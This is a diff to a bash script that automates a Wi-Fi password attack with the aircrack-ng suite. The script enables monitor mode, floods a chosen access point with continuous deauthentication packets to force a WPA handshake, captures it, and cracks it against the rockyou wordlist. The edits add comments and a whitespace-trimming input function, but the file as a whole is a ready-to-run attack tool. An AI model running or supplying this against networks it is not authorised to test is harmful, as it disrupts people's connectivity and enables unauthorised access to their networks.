@@ -20,18 +20,50 @@
 #
 #---------------------------------------------------------------------------------------------------------------------------
 
+# Function to sanitize user inputs
+sanitize_input() {
+    # Remove leading and trailing whitespaces
+    local input="$1"
+    input=$(echo "$input" | xargs)
+    echo "$input"
+}
+
+# Prompt for wireless interface name
 read -p "Enter the wireless interface name: " interface
+interface=$(sanitize_input "$interface")
+
+# Check for and kill processes that might interfere
 airmon-ng check kill
+
+# Start monitor mode on the specified interface
 airmon-ng start "$interface"
+
+# Display available networks
 airodump-ng "$interface"
+
+# Prompt for target BSSID and channel number
 read -p "Enter the BSSID of the target network: " bssid
 read -p "Enter the Channel number: " channel
+bssid=$(sanitize_input "$bssid")
+channel=$(sanitize_input "$channel")
+
+# Set the channel for the interface
 iwconfig "$interface" channel "$channel"
+
+# Create output directory and filename based on timestamp
 timestamp=$(date +"%Y-%m-%d_%H:%M:%S")
 output_dir="pcap_files"
 mkdir -p "$output_dir"
 output_file="${output_dir}/${bssid}_${timestamp}"
-xterm -e "aireplay-ng -0 0 -a $bssid $interface" & sleep 1 && xterm -e "airodump-ng --bssid $bssid -c $channel -w $output_file $interface" &
+
+# Launch attacks in separate xterm windows
+xterm -e "aireplay-ng -0 0 -a $bssid $interface" & sleep 1 && xterm -e "airodump-ng --bssid $bssid -c $channel -w $output_file $interface"
+
+# Wait for capture file to be generated
 pcap_file="${output_file}-01.cap"
+wait
+
+# Run aircrack-ng on the captured file using rockyou wordlist
 aircrack-ng -w "wordlists/rockyou.txt" "$pcap_file"
+
 exit 0
